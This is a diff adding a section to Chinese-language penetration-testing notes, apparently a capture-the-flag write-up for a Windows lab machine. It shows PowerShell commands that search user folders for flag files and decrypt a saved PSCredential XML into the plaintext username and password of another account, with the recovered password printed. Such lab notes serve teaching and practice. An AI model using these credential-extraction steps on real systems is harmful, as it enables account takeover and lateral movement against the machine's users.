@@ -97,6 +97,64 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
+### 寻找 `Users` `flag`
+
+```bash
+gci C:\Users\ -Filter *.txt -File -Recurse
+```
+
+### 读取 xml。
+
+在 `sfitz` 的 `Document` 中发现文件 `connection.xml`。
+
+```bash
+PS C:\Users\sfitz\Documents> cat connection.xml
+cat connection.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+读取密码。
+
+```bash
+PS C:\Users\sfitz\Documents> $cred = import-clixml -Path connection.xml
+$cred = import-clixml -Path connection.xml
+PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().UserName
+$cred.GetNetworkCredential().UserName
+alaading
+PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
+$cred.GetNetworkCredential().Password
+f8gQ8fynP44ek1m3
+```
+
+方法二
+
+```bash
+PS C:\Users\sfitz\Documents> $pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
+$pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
+PS C:\Users\sfitz\Documents> $cred = New-Object System.Management.Automation.PSCredential('alaading',$pass)
+$cred = New-Object System.Management.Automation.PSCredential('alaading',$pass)
+PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential() | fl
+$cred.GetNetworkCredential() | fl
+
+
+UserName       : alaading
+Password       : f8gQ8fynP44ek1m3
+SecurePassword : System.Security.SecureString
+Domain         : 
+```
+
 ## Print 系列漏洞
 
 1. PrintNIghtmare
